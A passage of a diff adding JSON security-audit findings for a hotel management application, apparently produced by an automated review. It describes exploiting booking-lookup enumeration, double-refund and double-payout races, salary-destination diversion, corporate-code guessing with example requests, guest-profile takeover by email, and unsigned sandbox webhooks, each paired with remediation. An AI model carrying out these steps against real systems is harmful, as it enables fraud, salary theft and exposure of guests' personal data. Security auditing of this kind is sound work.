+    "root_cause": "app/Modules/GuestPortal/Http/BookingEngineController.php:158 - returns manage_token, guest name, special_requests, deposit figures, loyalty number/tier/points, online check-in ID type",
+    "intended_behavior": "Lookup credential = confirmation + last name; the 8-char public_code is the intended unguessable reference",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/GuestPortal/public-routes.php",
+        "line": 14,
+        "scope": "entrypoint",
+        "description": "POST /api/v1/booking/{group}/reservations/lookup (throttle:public-write 20/min/IP)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/GuestPortal/Application/PublicBookingResolver.php",
+        "line": 31,
+        "scope": "propagation",
+        "description": "number lookup over the whole group by confirmation number (sequenced per hotel, per comment)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/GuestPortal/Application/PublicBookingResolver.php",
+        "line": 51,
+        "scope": "propagation",
+        "description": "distinct responses: 404 when number unknown, 404 name mismatch (same here) but 422 'ambiguous' when number exists in several hotels - partial oracle"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 198,
+        "scope": "propagation",
+        "description": "cancel() accepts the manage_token obtained above"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 158,
+        "scope": "sink",
+        "description": "returns manage_token, guest name, special_requests, deposit figures, loyalty number/tier/points, online check-in ID type"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 158,
+        "description": "returns manage_token, guest name, special_requests, deposit figures, loyalty number/tier/points, online check-in ID type"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "confirmation numbers are gapless sequences (NumberSequence)"
+      },
+      {
+        "kind": "data_state",
+        "description": "attacker has many IPs or patience"
+      },
+      {
+        "kind": "data_state",
+        "description": "surname distribution skewed"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous internet client",
+      "payloads": [
+        "see instructions (idor)"
+      ],
+      "instructions": [
+        "POST /api/v1/booking/{group}/reservations/lookup (throttle:public-write 20/min/IP)",
+        "returns manage_token, guest name, special_requests, deposit figures, loyalty number/tier/points, online check-in ID type"
+      ],
+      "observed_result": "Attacker iterates sequential confirmation numbers with common Cameroonian surnames (20 req/min/IP, no per-booking lockout) to obtain manage tokens, cancel competitors' bookings (fee charged to guest) and harvest loyalty balances"
+    },
+    "remediation": {
+      "strategy": "Require the public_code (reference) or confirmation + last name + arrival date; add per-number failure counter/lockout; do not return loyalty points/number from lookup"
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Anonymous internet client; Guest-to-guest boundary inside a group's public booking site"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Attacker iterates sequential confirmation numbers with common Cameroonian surnames (20 req/min/IP, no per-booking lockout) to obtain manage tokens, cancel competitors' bookings (fee charged to guest) and harvest loyalty balances"
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h1-tenancy"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "money:payments:refund-toctou-double-refund",
+    "title": "Gateway refund amount is checked on an unlocked intent and sent to the provider before the row lock, so concurrent refunds exceed the paid amount",
+    "description": "Two simultaneous refund requests of the full refundable amount both pass the checks, both call the provider refund API, both post a refund line; the hotel refunds up to 2x the payment and the folio goes into debit.",
+    "root_cause": "app/Modules/Payments/Application/PaymentService.php:254 - driverOf($intent)->refund(...) sends money back through MTN/Orange/card BEFORE the transaction and lockForUpdate at line 256-257; after the lock no re-check of refunded_amount is done",
+    "intended_behavior": "amount <= intent.amount - refunded_amount and refund <= folio credit balance",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Payments/Http/PaymentController.php",
+        "line": 56,
+        "scope": "PaymentController::refund",
+        "description": "POST refund by a payments.refund holder"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 244,
+        "scope": "PaymentService::refund",
+        "description": "Refundable amount and folio credit checked on unlocked rows"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 254,
+        "scope": "PaymentService::refund",
+        "description": "Gateway refund called before the lockForUpdate transaction; two concurrent calls both pass and both pay out"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 257,
+        "description": "lockForUpdate happens only after the provider call"
+      },
+      {
+        "file": "app/Modules/Payments/Application/PaymentService.php",
+        "line": 263,
+        "description": "refunded_amount incremented after the fact"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "timing_dependency",
+        "description": "two requests in flight concurrently (no Idempotency-Key header or different keys)"
+      },
+      {
+        "kind": "system_configuration",
+        "description": "real gateway credentials configured (otherwise dry-run refund succeeds too)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user holding payments.refund (or an idempotency-less retry/duplicate click from the UI)",
+      "payloads": [
+        "see instructions (race)"
+      ],
+      "instructions": [
+        "POST /api/v1/payments/intents/{intent}/refunds validates only amount min:1 and calls PaymentService::refund with an unlocked PaymentIntent",
+        "driverOf($intent)->refund(...) sends money back through MTN/Orange/card BEFORE the transaction and lockForUpdate at line 256-257; after the lock no re-check of refunded_amount is done"
+      ],
+      "observed_result": "Two simultaneous refund requests of the full refundable amount both pass the checks, both call the provider refund API, both post a refund line; the hotel refunds up to 2x the payment and the folio goes into debit."
+    },
+    "remediation": {
+      "strategy": "Open the DB::transaction and PaymentIntent::lockForUpdate() first, re-read refunded_amount and Folio::lockForUpdate()->balance inside it, insert the PaymentRefund row as pending, then call the gateway; mark succeeded afterwards."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user holding payments.refund (or an idempotency-less retry/duplicate click from the UI); Refundable-amount invariant (sum(refunds) <= intent.amount) and folio credit balance"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Two simultaneous refund requests of the full refundable amount both pass the checks, both call the provider refund API, both post a refund line; the hotel refunds up to 2x the payment and the folio goes into debit."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "money:payouts:process-race-double-disbursement",
+    "title": "PayoutService::process reads pending MoMo items without any lock, so two concurrent /process calls disburse each salary twice",
+    "description": "Both workers see the same pending items and call MtnDisbursement/OrangeDisbursement twice per employee; the second update overwrites the first provider_reference. Salaries are paid twice; GL posts once.",
+    "root_cause": "app/Modules/Payments/Application/Payouts/PayoutService.php:110 - $driver->disburse($item, ...) called for every item still 'pending' in the unlocked collection fetched at line 97-98; status update at line 111 happens after the provider call",
+    "intended_behavior": "item.status transitions pending -> sent/succeeded exactly once; attempts counter",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Payments/Http/MobileMoneyController.php",
+        "line": 135,
+        "scope": "MobileMoneyController::processPayout",
+        "description": "POST process by a payments.payouts holder"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Payments/Application/Payouts/PayoutService.php",
+        "line": 97,
+        "scope": "PayoutService::process",
+        "description": "Pending items selected without lock or transaction"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Payments/Application/Payouts/PayoutService.php",
+        "line": 110,
+        "scope": "PayoutService::process",
+        "description": "Provider disburse() called before the item status is updated; two overlapping calls disburse twice"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Payments/Application/Payouts/PayoutService.php",
+        "line": 177,
+        "description": "postPaid does lock the run, but only after disbursement"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "timing_dependency",
+        "description": "two concurrent requests (no Idempotency-Key)"
+      },
+      {
+        "kind": "system_configuration",
+        "description": "MoMo credentials configured (in dry run the duplicate is only visible in logs)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user holding payments.payouts (or UI double-submit / retry)",
+      "payloads": [
+        "see instructions (race)"
+      ],
+      "instructions": [
+        "POST /api/v1/payments/payouts/{payout}/process",
+        "$driver->disburse($item, ...) called for every item still 'pending' in the unlocked collection fetched at line 97-98; status update at line 111 happens after the provider call"
+      ],
+      "observed_result": "Both workers see the same pending items and call MtnDisbursement/OrangeDisbursement twice per employee; the second update overwrites the first provider_reference. Salaries are paid twice; GL posts once."
+    },
+    "remediation": {
+      "strategy": "Wrap process() in DB::transaction with PayoutRun::lockForUpdate() (or a cache lock per run) and re-select items with lockForUpdate(); mark an item 'sent' with its reference before calling the provider."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user holding payments.payouts (or UI double-submit / retry); One disbursement per payout item"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Both workers see the same pending items and call MtnDisbursement/OrangeDisbursement twice per employee; the second update overwrites the first provider_reference. Salaries are paid twice; GL posts once."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "money:payouts:single-role-destination-diversion",
+    "title": "One payments.payouts user can reject a bank/cash payout item, rewrite its destination to any string and re-run it (no four-eyes, no audit event)",
+    "description": "Attacker rejects a colleague's bank item, sets destination to their own account/number, downloads the bank CSV or processes the MoMo item; salary is diverted. Only the payout_run row changes; no audit trail of the edit.",
+    "root_cause": "app/Modules/Payments/Application/Payouts/PayoutService.php:167 - updateDestination() writes destination/channel on the item and re-queues it; bankFile() (line 123) and process() (line 94) then pay to it",
+    "intended_behavior": "Salary destinations come from the employee record; sensitive changes go through HR approval (SelfService::decide)",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Payments/Http/MobileMoneyController.php",
+        "line": 168,
+        "scope": "MobileMoneyController::updatePayoutItem",
+        "description": "PUT destination by a payments.payouts holder"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Payments/Http/MobileMoneyController.php",
+        "line": 160,
+        "scope": "MobileMoneyController::rejectPayoutItems",
+        "description": "The same role can first mark any bank/cash item failed"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Payments/Application/Payouts/PayoutService.php",
+        "line": 167,
+        "scope": "PayoutService::updateDestination",
+        "description": "Any destination string accepted, channel re-derived, no event recorded, item re-queued"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Payments/Application/Payouts/PayoutService.php",
+        "line": 129,
+        "description": "bankFile exports the item with the new destination"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "user has payments.payouts"
+      },
+      {
+        "kind": "data_state",
+        "description": "payout run in pending/processing state"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user holding only payments.payouts",
+      "payloads": [
+        "see instructions (business-logic)"
+      ],
+      "instructions": [
+        "PUT /api/v1/payments/payouts/{payout}/items/{item} validates destination as free string max:60",
+        "updateDestination() writes destination/channel on the item and re-queues it; bankFile() (line 123) and process() (line 94) then pay to it"
+      ],
+      "observed_result": "Attacker rejects a colleague's bank item, sets destination to their own account/number, downloads the bank CSV or processes the MoMo item; salary is diverted. Only the payout_run row changes; no audit trail of the edit."
+    },
+    "remediation": {
+      "strategy": "Restrict updateDestination to the value currently on the Employee record (or require hr.manage + record an event with old/new), validate format per channel, and forbid reject+update by the run creator."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user holding only payments.payouts; Employee bank/MoMo destination is HR master data (changed only via HR or an approved self-service request)"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Attacker rejects a colleague's bank item, sets destination to their own account/number, downloads the bank CSV or processes the MoMo item; salary is diverted. Only the payout_run row changes; no audit trail of the edit."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "pii:hr:employee-model-returns-bank-tax-ids-to-view-roles",
+    "title": "Employee has no $hidden; employees index/show return bank_account, momo_number, cnps_number, tax_number, base_salary and allowances to hr.view and payroll.manage holders",
+    "description": "Any hr.view user can export every colleague's bank account and MoMo number (useful for social engineering a payout diversion) and salary.",
+    "root_cause": "app/Modules/HR/Domain/Employee.php:14 - only $guarded defined, no $hidden/serialisation whitelist",
+    "intended_behavior": "SelfService::profile masks bank_account/momo_number even for the employee themselves (SelfService.php:48-55)",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/HR/Http/HrController.php",
+        "line": 52,
+        "scope": "entrypoint",
+        "description": "GET /hr/employees returns Employee models paginated (full toArray)"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/HR/Http/HrController.php",
+        "line": 63,
+        "scope": "propagation",
+        "description": "showEmployee loads contracts (salary history) too"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/HR/Http/HrController.php",
+        "line": 228,
+        "scope": "propagation",
+        "description": "can('view') accepted for hr.view and payroll.manage"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/HR/Domain/Employee.php",
+        "line": 14,
+        "scope": "sink",
+        "description": "only $guarded defined, no $hidden/serialisation whitelist"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/HR/Domain/Employee.php",
+        "line": 14,
+        "description": "only $guarded defined, no $hidden/serialisation whitelist"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "user has hr.view"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Staff user holding hr.view (e.g. department supervisors) ",
+      "payloads": [
+        "see instructions (pii-exposure)"
+      ],
+      "instructions": [
+        "GET /hr/employees returns Employee models paginated (full toArray)",
+        "only $guarded defined, no $hidden/serialisation whitelist"
+      ],
+      "observed_result": "Any hr.view user can export every colleague's bank account and MoMo number (useful for social engineering a payout diversion) and salary."
+    },
+    "remediation": {
+      "strategy": "Add an Employee API resource (or $hidden for bank_account, momo_number, cnps_number, tax_number) and expose those fields only to hr.manage/payroll.manage via an explicit endpoint."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Staff user holding hr.view (e.g. department supervisors) ; Need-to-know for payment destinations and government identifiers"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Any hr.view user can export every colleague's bank account and MoMo number (useful for social engineering a payout diversion) and salary."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h4-money-dos"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "public:booking:corporate-code-low-entropy-bills-company",
+    "title": "Public booking honours staff-chosen corporate codes (e.g. 'ACME') and books on the company's contract: negotiated rates, allotment rooms and company_id on the reservation, with a 300/min validity oracle",
+    "description": "Guessing a short code lets anyone consume a company's allotment and book at the confidential negotiated rate with company_id set (depending on folio routing, charges may route to the company's city ledger).",
+    "root_cause": "app/Modules/Reservations/Revenue/Application/CorporateService.php:173 - bookingFields(): reservation gets company_id, contract rate_plan_id, room_block_id (allotment) and source corporate:<code>",
+    "intended_behavior": "Corporate contract bookings are restricted to the company's travellers",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 108,
+        "scope": "BookingEngineController::book",
+        "description": "public POST /api/v1/booking/{group}/reservations accepts corporate_code (nullable string max:24); throttle public-write 20/min/ip; availability (GET, 300/min) accepts the same input"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Reservations/Revenue/Application/BookingSiteRevenue.php",
+        "line": 32,
+        "scope": "BookingSiteRevenue::decorate / prepare",
+        "description": "corporate->find(code) and, when found, corporate offers with negotiated totals are returned -> validity oracle"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Reservations/Revenue/Application/CorporateService.php",
+        "line": 126,
+        "scope": "CorporateService::find",
+        "description": "CorporateContract::where('code', strtoupper(trim($code)))->where('active', true) - the code is the only credential"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Reservations/Revenue/Http/OffersController.php",
+        "line": 67,
+        "scope": "OffersController::contracts (create)",
+        "description": "codes are staff-chosen, regex [A-Za-z0-9_-]{1,20}, unique per hotel - typically a company name"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Reservations/Revenue/Application/CorporateService.php",
+        "line": 172,
+        "scope": "CorporateService::bookingFields",
+        "description": "reservation created with company_id, contract rate_plan_id, room_block_id (allotment) and source 'corporate:<code>' (consumed by ReservationService::create line 84)"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Reservations/Revenue/Application/CorporateService.php",
+        "line": 165,
+        "description": "bookingFields() has no traveller/email-domain check; only availability and contract validity are tested"
+      },
+      {
+        "file": "app/Modules/FrontOffice/Application/FolioService.php",
+        "line": 216,
+        "description": "invoice(): bill_to_name/tax_id/address default to the company when folio->company_id is set - billing impact depends on whether folio routing copies reservation.company_id (not verified)"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "An active corporate contract with a guessable code exists for the hotel"
+      },
+      {
+        "kind": "data_state",
+        "description": "Billing to the company's city ledger additionally depends on folio routing rules for company reservations (unverified)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous website visitor",
+      "payloads": [
+        "GET /api/v1/booking/{group}/availability?hotel_code=X&arrival=..&departure=..&corporate_code=ACME",
+        "POST /api/v1/booking/{group}/reservations {..., \"corporate_code\":\"ACME\", \"rate_plan_id\":<contract plan>}"
+      ],
+      "instructions": [
+        "Enumerate likely company names/abbreviations against availability (300/min per IP) until a response contains 'corporate' offers",
+        "Book with the found code"
+      ],
+      "observed_result": "Reservation at the confidential negotiated rate, drawing from the company's allotment, with company_id set on the reservation"
+    },
+    "remediation": {
+      "strategy": "Generate corporate booking codes server-side with >= 64 bits of entropy (or require a company email domain match on the public channel), rate-limit corporate_code lookups per IP with lockout, and leave company_id null / status pending for public corporate bookings until staff confirm."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Anonymous internet user; Public booking API -> B2B corporate contract (confidential negotiated rate, allotment, company account)"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Guessing a short code lets anyone consume a company's allotment and book at the confidential negotiated rate with company_id set (depending on folio routing, charges may route to the company's city ledger)."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by v1-medium; hunter h3-public-files"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "public:booking:guest-profile-takeover-by-email",
+    "title": "Public booking attaches a reservation to any existing guest profile matched by email; lookup then discloses that guest's loyalty number, points and QR text, and online check-in overwrites the guest's ID data",
+    "description": "Attacker POSTs /api/v1/booking/{group}/reservations with guest.email = victim email and guest.last_name = victim last name (first name arbitrary), receives confirmation + manage token; POST reservations/lookup with that confirmation + victim last name returns the victim's loyalty card number, tier and points balance plus the QR string staff scan for earn/redeem; the attacker can also submit online check-in that rewrites the victim's stored ID number / birth date / address, and the fake booking appears under the victim's profile (member portal, history, marketing consent flag on the shared profile is untouched but the reservation and any special_requests are theirs). Cancellation later is free when the plan is refundable.",
+    "root_cause": "app/Modules/GuestPortal/Http/BookingEngineController.php:165 - lookup(): returns loyalty number, tier, points_balance and 'OPES-LOYALTY:<number>' QR text for the guest attached to the booking (and guest first/last name on line 162)",
+    "intended_behavior": "Guest identity on the public site is proven by confirmation number + last name; loyalty data should only be returned to the member",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 97,
+        "scope": "BookingEngineController::book",
+        "description": "Unauthenticated POST /api/v1/booking/{group}/reservations"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 120,
+        "scope": "BookingEngineController::book",
+        "description": "Existing Guest matched by email alone (or by member_number alone) and attached to the new booking"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 165,
+        "scope": "BookingEngineController::lookup",
+        "description": "lookup with confirmation + the victim's last name returns the victim's loyalty number, tier, points and QR text, plus a manage token"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/GuestPortal/Http/BookingEngineController.php",
+        "line": 118,
+        "description": "member_number lookup without last-name check"
+      },
+      {
+        "file": "app/Modules/Reservations/Experience/Application/DigitalCheckin.php",
+        "line": 59,
+        "description": "Digital check-in via the manage token overwrites the stored guest ID data"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "Victim has a Guest row (any prior stay) in the group; loyalty disclosure additionally requires an active membership"
+      },
+      {
+        "kind": "authentication_level",
+        "description": "Attacker knows victim email + last name (both commonly public)"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous internet user who knows a guest's email address and last name",
+      "payloads": [
+        "see instructions (public-auth)"
+      ],
+      "instructions": [
+        "book(): Guest::where('email', $data['guest']['email'])->first() reuses an existing guest row with no proof that the caller owns that email; member_number on line 118 likewise binds the booking to Membership->guest without the last-name check used elsewhere",
+        "lookup(): returns loyalty number, tier, points_balance and 'OPES-LOYALTY:<number>' QR text for the guest attached to the booking (and guest first/last name on line 162)"
+      ],
+      "observed_result": "Attacker POSTs /api/v1/booking/{group}/reservations with guest.email = victim email and guest.last_name = victim last name (first name arbitrary), receives confirmation + manage token; POST reservations/lookup with that confirmation + victim last name returns the victim's loyalty card number, tier and points balance plus the QR string staff scan for earn/redeem; the attacker can also submit online check-in that rewrites the victim's stored ID number / birth date / address, and the fake booking appears under the victim's profile (member portal, history, marketing consent flag on the shared profile is untouched but the reservation and any special_requests are theirs). Cancellation later is free when the plan is refundable."
+    },
+    "remediation": {
+      "strategy": "In book(): never attach a public booking to an existing guest by email alone; create a new guest row (or only reuse when the member_number + last name pair matches, as member() does on line 228-236) and require last-name match for member_number on line 118. In lookup(): drop the 'loyalty' block (or only return it when the request also carries the member's own credential)."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Preconditions: Anonymous internet user who knows a guest's email address and last name; Unauthenticated public booking API -> another guest's profile (Guests.guest row, loyalty membership) in the group"
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Attacker POSTs /api/v1/booking/{group}/reservations with guest.email = victim email and guest.last_name = victim last name (first name arbitrary), receives confirmation + manage token; POST reservations/lookup with that confirmation + victim last name returns the victim's loyalty card number, tier and points balance plus the QR string staff scan for earn/redeem; the attacker can also submit online"
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent; hunter h3-public-files"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "public:booking:lookup-status-oracle",
+    "title": "PublicBookingResolver answers 403 'Invalid link' for a wrong manage token but 404 for an unknown reference, and 422 'ambiguous' when several bookings share a confirmation number: existence oracle on booking references",
+    "description": "Distinguishable responses let an attacker confirm that a confirmation number / 8-char public_code exists (public_code space is 31^8 so brute force is impractical; sequential confirmation numbers are trivially enumerable but reveal only existence).",
+    "root_cause": "app/Modules/GuestPortal/Application/PublicBookingResolver.php:121 - 422 'Several bookings share this confirmation number' returned before any ownership proof when lastName/token are absent (review path allows token null + last_name)",
+    "intended_behavior": "Comment: 'Never picks the first of several matches' and uniform 404 on name mismatch",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/GuestPortal/Application/PublicBookingResolver.php",
+        "line": 104,
+        "scope": "entrypoint",
+        "description": "fail(404) when empty vs fail(403) on token mismatch (line 110) vs fail(422) ambiguous (line 121)"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/GuestPortal/Application/PublicBookingResolver.php",
+        "line": 121,
+        "scope": "sink",
+        "description": "422 'Several bookings share this confirmation number' returned before any ownership proof when lastName/token are absent (review path allows token null + last_name)"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/GuestPortal/Application/PublicBookingResolver.php",
+        "line": 121,
+        "description": "422 'Several bookings share this confirmation number' returned before any ownership proof when lastName/token are absent (review path allows token null + last_name)"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "public-write throttle 20/min per ip+uri limits volume"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anonymous internet user",
+      "payloads": [
+        "see instructions (enumeration)"
+      ],
+      "instructions": [
+        "fail(404) when empty vs fail(403) on token mismatch (line 110) vs fail(422) ambiguous (line 121)",
+        "422 'Several bookings share this confirmation number' returned before any ownership proof when lastName/token are absent (review path allows token null + last_name)"
+      ],
+      "observed_result": "Distinguishable responses let an attacker confirm that a confirmation number / 8-char public_code exists (public_code space is 31^8 so brute force is impractical; sequential confirmation numbers are trivially enumerable but reveal only existence)."
+    },
+    "remediation": {
+      "strategy": "Return the same 404 body for not-found, bad token and name mismatch; only emit the 'ambiguous' hint after the last name or token matched at least one candidate (it already does for the name path; make the token path identical)."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Preconditions: Anonymous internet user; Public API -> existence of a reservation reference / confirmation number in a group"
+      },
+      "impact": {
+        "score": "informational",
+        "reason": "Distinguishable responses let an attacker confirm that a confirmation number / 8-char public_code exists (public_code space is 31^8 so brute force is impractical; sequential confirmation numbers are trivially enumerable but reveal only existence)."
+      },
+      "overall_severity": "informational"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h3-public-files"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "public:channels:sandbox-unsigned-inbound",
+    "title": "Channel inbound webhooks for connections in 'sandbox' environment without a webhook_secret accept unsigned bookings",
+    "description": "Fake OTA bookings (and XML payloads up to the body limit) can be injected into a hotel whose connection was left in sandbox with no secret; the uuid (whereUuid) is the only secret and appears in provider configuration screens/logs.",
+    "root_cause": "app/Modules/Channels/Application/Drivers/BaseDriver.php:57 - verify(): return $c->environment === 'sandbox' when webhook_secret is empty -> true",
+    "intended_behavior": "Each connection authenticates its provider by HMAC",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/Channels/Http/InboundController.php",
+        "line": 35,
+        "scope": "entrypoint",
+        "description": "receive(): $driver->verify() decides"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/Channels/Http/InboundController.php",
+        "line": 46,
+        "scope": "propagation",
+        "description": "BookingImporter::import() creates reservations"
+      },
+      {
+        "kind": "sink",
+        "file": "app/Modules/Channels/Application/Drivers/BaseDriver.php",
+        "line": 57,
+        "scope": "sink",
+        "description": "verify(): return $c->environment === 'sandbox' when webhook_secret is empty -> true"
+      }
+    ],
+    "evidence": [
+      {
+        "file": "app/Modules/Channels/Application/Drivers/BaseDriver.php",
+        "line": 57,
+        "description": "verify(): return $c->environment === 'sandbox' when webhook_secret is empty -> true"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "A connection with environment=sandbox, receive_reservations=true and no webhook_secret is reachable on the public host"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Anyone who learns a sandbox connection uuid",
+      "payloads": [
+        "see instructions (webhook)"
+      ],
+      "instructions": [
+        "receive(): $driver->verify() decides",
+        "verify(): return $c->environment === 'sandbox' when webhook_secret is empty -> true"
+      ],
+      "observed_result": "Fake OTA bookings (and XML payloads up to the body limit) can be injected into a hotel whose connection was left in sandbox with no secret; the uuid (whereUuid) is the only secret and appears in provider configuration screens/logs."
+    },
+    "remediation": {
+      "strategy": "Require a webhook_secret for every connection that receives reservations, sandbox included (generate one at connection creation)."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Preconditions: Anyone who learns a sandbox connection uuid; Unauthenticated POST -> reservation import into the hotel"
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Fake OTA bookings (and XML payloads up to the body limit) can be injected into a hotel whose connection was left in sandbox with no secret; the uuid (whereUuid) is the only secret and appears in provider configuration screens/logs."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently re-derived from source by sec1-parent spot-check; hunter h3-public-files"
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "public:checkin:id-photo-no-magic-check",
+    "title": "Public digital check-in stores the ID photo from a base64 data URL with only a prefix check (no magic-byte/finfo validation), unlike the staff path",
+    "description": "Arbitrary bytes up to 2 MB written under storage/app/checkins with a .jpg/.png/.webp name; when later decoded by image libraries (thumbnails, PDF embedding) malformed input reaches the decoder. No direct code execution path identified.",
+    "root_cause": "app/Modules/Reservations/Experience/Application/DigitalCheckin.php:123 - storePhoto(): Storage::disk('local')->put(\"checkins/{hotel}/{id}-id.<ext>\", base64 bytes) with extension taken from the declared mime, bytes never checked",
+    "intended_behavior": "Only JPEG/PNG/WebP images accepted (as enforced on the staff path)",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "app/Modules/GuestPortal/Http/ManageController.php",
+        "line": 65,
+        "scope": "entrypoint",
+        "description": "checkin(): id_photo string accepted"
+      },
+      {
+        "kind": "propagation",
+        "file": "app/Modules/FrontOffice/Http/FrontDeskExtrasController.php",
+        "line": 220,
+        "scope": "propagation",
+        "description": "staff path uses finfo buffer check (store()) and Storage::disk('local')->response() serves by extension-derived mime; nosniff is set by SecurityHeaders so browser execution is unlikely"
+      },
+      {
+        "kind": "sink",
